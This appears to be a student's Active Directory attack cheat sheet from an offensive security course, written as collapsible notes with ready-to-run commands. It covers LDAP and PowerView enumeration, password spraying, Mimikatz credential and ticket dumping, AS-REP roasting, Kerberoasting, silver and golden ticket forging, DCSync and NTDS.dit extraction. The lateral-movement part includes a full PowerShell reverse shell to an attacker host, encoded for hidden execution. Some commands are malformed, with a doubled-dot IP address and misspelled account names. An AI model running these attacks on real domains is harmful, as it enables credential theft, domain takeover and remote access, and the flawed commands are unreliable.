## Enumeration

#### Via LDAP from Windows

>[!code]- List all objects
>Create the script:
>>[!code]- enumeration.ps1
>>```powershell
>>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>>$DN = ([adsi]'').distinguishedName 
>>$LDAP = "LDAP://$PDC/$DN"
>>
>>$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
>>
>>$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
>>$dirsearcher.FindAll()
>>```
>
>Run it:
>```powershell
>PS C:\Users\stephanie> .\enumeration.ps1
>```

>[!code]- List all user account objects via a filter
>Create the script:
>
>This time we added a filter (see the filter syntax [here](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax)) for the **samAccountType** to equal decimal **805306368** which is hex **0x30000000**, which denotes a user account.
>>[!code]- enumeration.ps1
>>```powershell
>>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>>$DN = ([adsi]'').distinguishedName 
>>$LDAP = "LDAP://$PDC/$DN"
>>
>>$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
>>
>>$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
>>$dirsearcher.filter="samAccountType=805306368"
>>$dirsearcher.FindAll()
>>```
>
>___
>Other filter values are [here](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax):
>>[!info]- samAccountType values
>>```powershell
>>- SAM_DOMAIN_OBJECT 0x0
>>- SAM_GROUP_OBJECT 0x10000000
>>- SAM_NON_SECURITY_GROUP_OBJECT 0x10000001
>>- SAM_ALIAS_OBJECT 0x20000000
>>- SAM_NON_SECURITY_ALIAS_OBJECT 0x20000001
>>- SAM_USER_OBJECT 0x30000000
>>- SAM_NORMAL_USER_ACCOUNT 0x30000000
>>- SAM_MACHINE_ACCOUNT 0x30000001
>>- SAM_TRUST_ACCOUNT 0x30000002
>>- SAM_APP_BASIC_GROUP 0x40000000
>>- SAM_APP_QUERY_GROUP 0x40000001
>>- SAM_ACCOUNT_TYPE_MAX 0x7fffffff
>>```
>
>Run it:
>```powershell
>PS C:\Users\stephanie> .\enumeration.ps1
>```

>[!code]- List all object's properties or one specific property
>Create the script to enumerate all properties:
>>[!code]- enumeration.ps1
>>```powershell
>>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>>$DN = ([adsi]'').distinguishedName 
>>$LDAP = "LDAP://$PDC/$DN"
>>
>>$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
>>
>>$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
>>$dirsearcher.filter="samAccountType=805306368"
>>$dirsearcher.FindAll()
>>$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
>>$dirsearcher.filter="samAccountType=805306368"
>>$result = $dirsearcher.FindAll()
>>
>>Foreach($obj in $result)
>>{
>>   Foreach($prop in $obj.Properties)
>>    {
>>        $prop
>>    }
>>    Write-Host "-------------------------------"
>>}
>>```
>
>Or to display only one specific property (by adding the **.memberof**):
>```powershell
>Foreach($obj in $result)
>{
>   Foreach($prop in $obj.Properties)
>    {
>        $prop.memberof
>    }
>    Write-Host "-------------------------------"
>}
>```
>___
>Run the script:
>```powershell
>PS C:\Users\stephanie> .\enumeration.ps1
>```

>[!code]- Create a function that enumerates objects using user input
>Create the module:
>>[!code]- function.ps1
>>```powershell
>>function LDAPSearch {
>>	param (
>>	    [string]$LDAPQuery
>>    )
>>
>>   $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>>    $DistinguishedName = ([adsi]'').distinguishedName
>>
>>    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
>>
>>   $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
>>
>>  return $DirectorySearcher.FindAll()
>>}
>>```
>
>Import it:
>```powershell
>PS C:\Users\stephanie> Import-Module .\function.ps1
>```
>Use it:
>```powershell
>PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"
>PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"
>PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
>```
>Use it to enumerate the objects in the each group object:
>```powershell
>PS C:\Users\stephanie\Desktop> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
> >>$group.properties | select {$_.cn}, {$_.member}
> >>}
>```
#### Via LDAP from Linux

>[!code]- Use ldapsearch
>```bash
>ldapsearch -x -H ldap://AD_SERVER -b "dc=DOMAIN,dc=COM" -D "USERNAME@DOMAIN" -w "password"
>```

>[!code]- Use windapsearch.py
>```bash
python windapsearch.py
>```
#### Via PowerView and net.exe

>[!code]- Domain information
>Powerview:
>```powershell
>PS C:\Tools> Get-NetDomain
>```

>[!code]- Domain users and groups
>Net.exe:
>```powershell
># users
>C:\Users\stephanie>net user /domain
>C:\Users\stephanie>net user jeffadmin /domain
>
># groups
>C:\Users\stephanie>net group /domain
>PS C:\Tools> net group "Sales Department" /domain
>```
>PowerView:
>```powershell
># users
>PS C:\Tools> Get-NetUser
>PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon
>
># groups
>PS C:\Tools> Get-NetGroup | select cn
>PS C:\Tools> Get-NetGroup "Sales Department" | select member
>```

>[!code]- Password policy
>net.exe:
>- **Lockout threshold** = number of incorrect attempts to lock the account
>- **Lockout duration** = number of minutes the account will be locked for
>- **Observation window** = number of minutes after which number of attempts resets
>```powershell
>PS C:\Users\jeff> net accounts
>```

>[!code]- Vulnerable accounts (AS-REP roastable & pre-auth disabled accounts)
>AS-REP roastable accounts:
>
>PowerView:
>```powershell
>PS C:\Tools> Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
>```
>Impacket:
>- **-request** to obtain the NTLM hash of the account
>- **-outputfile** to write the obtained hash to a file
>```bash
>kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70 [-request] [-outputfile hashes.asreproast] corp.com/pete
>```
>___
>
>Kerberos pre-authentication disabled accounts:
>```powershell
>PS C:\Tools> Get-DomainUser -KerberosPreuthNotRequired
>```

>[!code]- Domain computers
>Computers:
>```powershell
>PS C:\Tools> Get-NetComputer
>PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
>PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
>```

>[!code]- Find where current user is admin
>This command can take several minutes to complete.
>```powershell
>PS C:\Tools> Find-LocalAdminAccess
>```

>[!code]- Logged on users
>**PowerView:**
>Warning: this command might not work on machines running Windows Server 2019 build 1809 or Windows 10 build 1709. It may also not work if the current user doesn't have the correct permissions. It may give a result, but that result might be false.
>```powershell
>PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
>```
>___
>
>**PsLoggedOn.exe:**
>Warning: this tool relies on the _Remote Registry_ service to work, but that service has not been enabled by default on Windows since Windows 8. The tool may also show our current user as logged on on other machines, because the tool requires to log on temporarily to work.
>```powershell
>PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04
>```

>[!code]- Service Principal Names (SPNs)
>setspn.exe
>```powershell
>c:\Tools> setspn -L iis_service
>
># Extract all SPNs
>c:\Tools> setspn -T corp -Q */*
>```
>PowerView:
>```powershell
>PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
>```
>PowerShell
>```powershell
>PS C:\Tools> get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
>
>PS C:\Tools> get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
>```
^ff3cc3
>[!code]- SPN to IP address
>```powershell
>PS C:\Tools\> nslookup.exe web04.corp.com
>```

>[!code]- Object permissions
>>[!info]- Object permissions
>>![[Pasted image 20240605051150.png]]
>
>PowerView:
>```powershell
># List the ACEs applied to the stephanie user object
>PS C:\Tools> Get-ObjectAcl -Identity stephanie
>
># Search for objects which have GenericAll permissions on a particular group object 
>PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
>```

>[!code]- Convert an SID to a name
>One SID:
>```powershell
>PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
>```
>Multiple SIDs:
>```powershell
>PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
>```

>[!code]- List domain shares
>The sysvol share:
>- Every domain user has access to it
>- It contains various domain policies and scripts
>- By default it is mapped to **%SystemRoot%\SYSVOL\Sysvol\domain-name**
>- There may be GPP encrypted passwords in there; use gpp-decrypt to decrypt it
>```powershell
>PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
>PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
>```
>PowerView:
>- **-CheckShareAccess** only displays those that are available to our current user
>```powershell
>PS C:\Tools> Find-DomainShare [-CheckShareAccess]
>```
#### Via SharpHound and BloodHound

>[!info]- Info - SharpHound collects the data, BloodHound analyses it

>[!code]- Run SharpHound on a domain joined machine
>Import it:
>```powershell
>PS C:\Tools> Import-Module .\Sharphound.ps1
>```
>Run it:
>- **-CollectMethod** to specify what data to collect
>- **-OutputPrefix** to specify what prefix to add to the resultant file name
>- The produced bin file can be deleted afterwards (it speeds up collection)
>```powershell
>PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
>```

>[!code]- Analyse the SharpHound data
>Transfer it to Kali:
>See the options [[Transfer Files#Transfer to Linux|here]].
>___
>
>Start Neo4j and BloodHound:
>- The default Neo4j credentials are neo4j:neo4j
>```bash
>kali@kali:~$ sudo neo4j start
>kali@kali:~$ bloodhound
>```
>___
>Upload the SharpHound zip file into BloodHound

___
## Privilege Escalation
#### Password Spraying

>[!code]- Using LDAP and ADSI
>This method is relatively slow.
>[Download Spray-Passwords.ps1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1)
>___
>
>Run it:
>- **-Pass** to specify a password to spray
>- [**-File**] to submit a password list to spray
>- **-Admin** to test admin accounts as well
>```powershell
>PS C:\Tools> powershell -ep bypass
>PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
>```

>[!code]- Using CrackMapExec
>- CME might lock accounts as it doesn't examine the password policy beforehand
>- **-u** to specify a list containing usernames to attempt
>- **--continue-on-success** to avoid terminating at the first successful credential
>- **'+'** = success, **'-'** = failure, **'Pwn3d!** = success and user has admin privileges
>```bash
>kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
>```

>[!code]- Using Kerbrute
>- If error - ensure the usernames.txt file is encoded as ANSI
>- Notepad's _Save As_ feature can change the encoding
>```powershell
>PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
>```
>___
>```bash
>./kerbrute_linux_amd64 userenum -d $DOMAIN -dc $DOMAIN_CONTROLLER usernames.txt
>```
#### Cached hashes in the LSASS memory

>[!warning] Requires - Login credentials with SYSTEM or local admin privileges

>[!code]- Using Mimikatz
>Start PowerShell as admin and load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Engage SeDebugPrivilege:
>```
>mimikatz # privilege::debug
>```
>Dump hashes:
>```
>mimikatz # sekurlsa::logonpasswords
>```
#### Cached Tickets (TGTs and TGSs)

>[!warning] Requires - Login credentials with SYSTEM or local admin privileges

>[!code]- Using Mimikatz
>Start PowerShell as admin and load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Engage SeDebugPrivilege:
>```
>mimikatz # privilege::debug
>```
>Dump tickets:
>```
>mimikatz # sekurlsa::tickets
>```
#### AS-REP Roasting

>[!warning]- Requires - Domain login credentials

>[!info]- Info - What is AS-REP roasting?
>[Further information.](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)
>
When preauthentication is enabled, a user who needs access to a resource begins the Kerberos authentication process by sending an Authentication Server Request (AS-REQ) message to the domain controller (DC). The timestamp on that message is encrypted with the hash of the user’s password. If the DC can decrypt that timestamp using its own record of the user’s password hash, it will send back an Authentication Server Response (AS-REP) message that contains a Ticket Granting Ticket (TGT) issued by the Key Distribution Center (KDC), which is used for future access requests by the user.
>

>[!exploit]- Exploit - If an account has Kerberos pre-authentication disabled, we could force it to send us a message encrypted with its password, then attempt to decrypt that password 
>However, if preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an AS-REP message. Since part of that message is encrypted using the user’s password, the attacker can then attempt to brute-force the user’s password offline.

>[!code]- Using impacket-GetNPUsers (on Linux)
>- **dc-ip** specifies the IP address of the domain controller
>- **-request** to request the TGT
>- -**domain/user** to specify a domain user to connect to the AD environment with
>```bash
>kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
>```

>[!code]- Using Rubeus (on Windows)
>- Since we're executing the command from a domain-joined machine, we don't have to provide any login options
>- **/nowrap** specifies to prevent new lines being added to any resultant AS-REP hashes
>```powershell
>PS C:\Tools> .\Rubeus.exe asreproast /nowrap [/format:hashcat] [/outfile:C:\Temp\hashes.txt]
>```

>[!code]- Cracking any found hashes
>With Hashcat:
>```bash
>kali@kali:~$ hashcat --help | grep -i "Kerberos"
>
>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```
#### Kerberoasting

>[!warning]- Requires - Domain login credentials

>[!warning]- Limitation - some SPN passwords will be uncrackable

>[!info]- Info - How does kerberoasting works?
>**Offsec explanation:**
>
>Let's recall how the Kerberos protocol works. We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
>
When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
>
These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.
>
The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.
>
>___
>
>**[Harmjoy](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) explanation:**
>
>1. A attacker authenticates to a domain and gets a ticket-granting-ticket (TGT) from the domain controller that’s used for later ticket requests.
>2. The attacker uses their TGT to issue a service ticket request (TGS-REQ) for a particular servicePrincipalName (SPN) of the form **sname/host**, e.g. MSSqlSvc/SQL.domain.com. This SPN should be unique in the domain, and is registered in the servicePrincipalName field of a user or computer account. During this request process, the attacker can specify what Kerberos encryption types they support (RC4_HMAC, AES256_CTS_HMAC_SHA1_96, etc).
>3. If the attacker’s TGT is valid, the DC extracts information from the TGT stuffs it into a service ticket. Then the domain controller looks up which account has the requested SPN registered in its servicePrincipalName field. The service ticket is encrypted _with the hash of the account with the requested SPN registered,_ using the highest level encryption key that both the attacker and the service account support. The ticket is sent back to the attacker in a service ticket reply (TGS-REP).
>4. The attacker extracts the encrypted service ticket from the TGS-REP. Since the service ticket was encrypted with the hash of the account linked to the requested SPN, the attacker can crack this encrypted blob offline to recover the account’s plaintext password.

>[!exploit]- Exploit - We obtain a TGS encrypted with an SPN account's password hash to attempt to decrypt their password

>[!code]- Obtain SPN account hashes automatically
>With Rubeus (Windows):
>- The identified SPNs will relate to the domain user that the command is run in the context of
>```powershell
>PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
>```
>___
>
>With impacket-GetUserSPNs:
>- **-request** to obtain the TGS and output them in a Hashcat compatible format
>- **-dc-ip** to specify the IP address of the domain controller
>- **domain/user**  to specify which user to connect to the AD environment as
>```bash
>kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
>```

>[!code]- Obtain an SPN account hash manually (with .NET classes)
>Request a TGS ticket:
>```powershell
>PS C:\> Add-Type -AssemblyName System.IdentityModel
>
>PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "\<SPN>"
>```
>Extract the SPN hash from that TGS ticket:
>```
mimikatz # kerberos::list /export
>```
>

>[!code]- Crack the obtained SPN account hash
>With tgsrepcrack.py:
>```bash
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
>```
>___
>
>With Hashcat:
>```bash
>kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```
#### Silver Tickets

>[!warning]- Requires - Domain login credentials and an SPN passwords

>[!info]- Info - What is a silver ticket?
>Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
>
>With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a _silver ticket_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn3) and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
>
>In general, we need to collect the following three pieces of information to create a silver ticket:
>- SPN password hash
>- Domain SID
>- Target SPN

>[!warning]- Limitation - can no longer get silver tickets for non-existent accounts 
>Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn5) With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.

>[!exploit]- Exploit - With a service's hash we can forge a TGS which has any permissions on that service that we desire

>[!code]- Obtain the information required to forge a TGS
>Obtain a SPN password (via a TGS)
>- If with admin privileges, see [[21, 22, 23 Active Directory#Cached Tickets (TGTs and TGSs)|how to dump cached TGS tickets with Mimikatz]] or [[21, 22, 23 Active Directory#Cached hashes in the LSASS memory|how to dump cached logon hashes with Mimikatz]]
>- Else, see [[21, 22, 23 Active Directory#Kerberoasting|how to obtain a TGS via Kerberoasting]]
>
>Obtain the domain SID:
>```powershell
>PS C:\Users\jeff> whoami /user
>```
>
>Obtain a target SPN by [[21, 22, 23 Active Directory#^ff3cc3|listing SPNs]].
>

>[!code]- Create a forged TGS with the obtained information
>With Mimikatz:
>- **/sid** specifies the domain SID
>- **/domain** specifies the domain name
>- **/target** specifies where the SPN runs
>- **/service** specifies the SPN protocol
>- **/rc4** specifies the SPN's NTLM hash
>- **/ptt** allows us to inject the forged ticket into the memory of the machine we execute the command on
>- **/user** specifies an existing domain user
>```
>mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
>```
>Confirm the TGS is in memory:
>```powershell
>PS C:\Tools> klist
>```
#### DCSync Attack

>[!warning] Requires domain login credentials with _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ permissions.
>(By default, members of the Administrators, Domains Admins or Enterprise Admins group are assigned these rights.)

>[!info]- Info - a [comprehensive guide.](https://adsecurity.org/?p=2398#MimikatzDCSync)to the DCSync Attack

>[!exploit]- Exploit - We can obtain a copy of the domain from the DC if we have appropriate privileges
>Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

>[!code]- Using Mimikatz
>Load Mimikatz:
>```powershell
>PS C:\Tools\> .\mimikatz.exe
>```
>Perform the DCSync attack:
>- **/user** to provide the username of the domain user we want to obtain the hash for
>```
>mimikatz # lsadump::dcsync /user:corp\dave
>mimikatz # lsadump::dcsync /user:corp\Administrator
>```

>[!code]- Using impacket-secretsdump
>- **-just-dc-user** to specify the user to obtain hash for
>- **domain/user:password@ip** to specify the credentials of the domain user with the necessary permissions as well as the IP address of the DC
>```bash
>kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
>```

>[!code]- Crack obtained NTLM hash
>With Hashcat:
>```bash
>kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>```
#### Golden Ticket

>[!warning] Requires - the krbtgt hash

>[!exploit]- Exploit - With the krbtgt hash we can forge TGTs, allowing us to forge any TGSs

>[!code]- Purge any existing kerberos tickets
>With Mimikatz:
>```powershell
>mimikatz # kerberos::purge
>```
>___
>With cmd:
>```powershell
>klist purge
>```

>[!code]- Launch a new cmd process with an injected golden TGT with Mimikatz
>Get the domain SID for the Mimikatz command:
>```powershell
>C:\Users\pete> whoami /user
>```
>___
>Create the golden ticket with Mimikatz:
>- **/krbtgt** (instead of **/rc4**) to specify that we are supplying the password hash of the _krbtgt_ user account
>- We specify an existing domain user, **jen** (before Microsoft patched Windows in July 2022, we didn't have to)
>```powershell
>mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
>```
>___
>Launch a new cmd process with the injected golden ticket:
>```powershell
>mimikatz # misc::cmd
>```

>[!code]- On the new cmd process use PsExec to start a remote session
>- Specify the remote machine with the dns name rather than IP address, otherwise NTLM authentication would be used and not the golden Kerberos ticket and would fail
>```powershell
>C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
>```
#### Shadow Copies

>[!warning]- Requires - Member of the Domain Admins group

>[!exploit]- Abuse the vshadow utility to create a copy of the AD database and extract every user credential

>[!code]- Create a shadow copy of the NTDS.dit
>Launch an elevated command prompt.
>___
>Create a shadow copy with vshadow.exe
>- **-nw** to [disable writers](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details), which speeds up backup creation
>- **-p** option to store the copy on disk
>```powershell
>C:\Tools>vshadow.exe -nw -p  C:
>```
>___
>
>Note the device name.

>[!code]- Backup the current NTDS.dit and system registry hive
>NTDS.dit:
>```powershell
>C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
>```
>___
>
>System registry hive:
>```powershell
>C:\>reg.exe save hklm\system c:\system.bak
>```

>[!code]- Extract credentials from the NTDS.dit using the system registry hive
>- **-ntds** to provide the ntds.dit backup file we created
>- **-system** to provide the backup system registry file
>- **LOCAL** to parse the files locally
>```bash
>kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
>```

___
## Lateral Movement
#### wmic.exe

>[!warning]- Requires - Admin privileges on the remote machine

>[!warning]- Limitation - The wmic utility is about to be deprecated
>**[Update - January 2024]**: Currently, WMIC is a Feature on Demand (FoD) that's [preinstalled by default](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/features-on-demand-non-language-fod#wmic) in Windows 11, versions 23H2 and 22H2. In the next release of Windows, the WMIC FoD will be disabled by default.
>
>[Read more.](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features)The WMIC utility is deprecated in Windows 10, version 21H1 and the 21H1 General Availability Channel release of Windows Server. This utility is superseded by [Windows PowerShell for WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi). Note: This deprecation applies to only the [command-line management utility](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic). WMI itself isn't affected.

>[!code]- Spawn a remote process (eg. calculator)
>- Launch the calculator app as jen on machine 192.168.50.73
>```powershell
>C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
>```
#### PowerShell WMI

>[!warning]- Requires - Admin privileges on the remote machine

>[!code]- Spawn a remote process (eg. calculator)
>- Launch the calculator app on 192.168.50.73 as the user jen
>```powershell
>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>$options = New-CimSessionOption -Protocol DCOM
>$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
>$command = 'calc';
>
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>```

>[!code]- Spawn a reverse shell
>Encode the reverse shell:
>- Send the reverse shell to 192.168.118.2 (Kali)
>
>>[!code]- encode.py
>>```python
>>import sys
>>import base64
>>
>>payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>>
>>cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
>>
>>print(cmd)
>>```
>
>Execute the encoding script:
>```bash
>kali@kali:~$ python3 encode.py
>```
>Execute the following commands to execute the reverse shell on the remote machine as jen:
>```powershell
>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>$options = New-CimSessionOption -Protocol DCOM
>$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
>$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
>
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>```
>Setup a listener on Kali:
>```bash
>kali@kali:~$ nc -lnvp 443
>```
#### WinRM

>[!warning]- Requires - Admin privileges or part of the Remote Management Users group on the remote machine

>[!code]- Via winrs.exe
>- **-r** to specify the target machine
>- **-u** and **-p** to specify the username and password of the user to execute the command
>
>Execute a simple command:
>```powershell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
>```
>___
>
>Execute a reverse shell:
>```powershell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD... HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
>```

>[!code]- Using PowerShell
>```powershell
>PS C:\Users\jeff> $username = 'jen';  
>PS C:\Users\jeff> $password = 'Nexus123!';  
>PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext - Force;  
>PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
>PS C:\Users\jeff> Enter-PSSession 1
>```
#### impacket-wmiexec

>[!warning]- Requires - Remote admin privileges, ADMIN$, File and Printer Sharing enabled
>1. Admin privileges on the remote machine
>2. SMB ADMIN$ share available
>3. File and Printer Sharing enabled (it is by default)

>[!warning]- Limitation - The [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a) prevented this technique from being used to authenticate as a non-default local admin

>[!code]- Obtain a non-interactive shell with a hash
>- Authenticating as the local administrator account on 192.168.50.73
>```powershell
>kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
>```
^72837c

>[!code]- Obtain a non-interactive shell with a password
>- Authenticating as the local admin account on 192.168.50.73
>```bash
>kali@kali:~$ /usr/bin/impacket-wmiexec corp/Administator:"Password123@"192.168..50.73
>
>kali@kali:~$ /usr/bin/impacket-wmiexec corp/Administator:"Password123\!"192.168..50.73
>```
#### PsExec

>[!warning]- Requires - Remote admin privileges, ADMIN$, File and Printer Sharing enabled
>1. Admin privileges on the remote machine
>2. SMB ADMIN$ share available
>3. File and Printer Sharing enabled (it is by default)

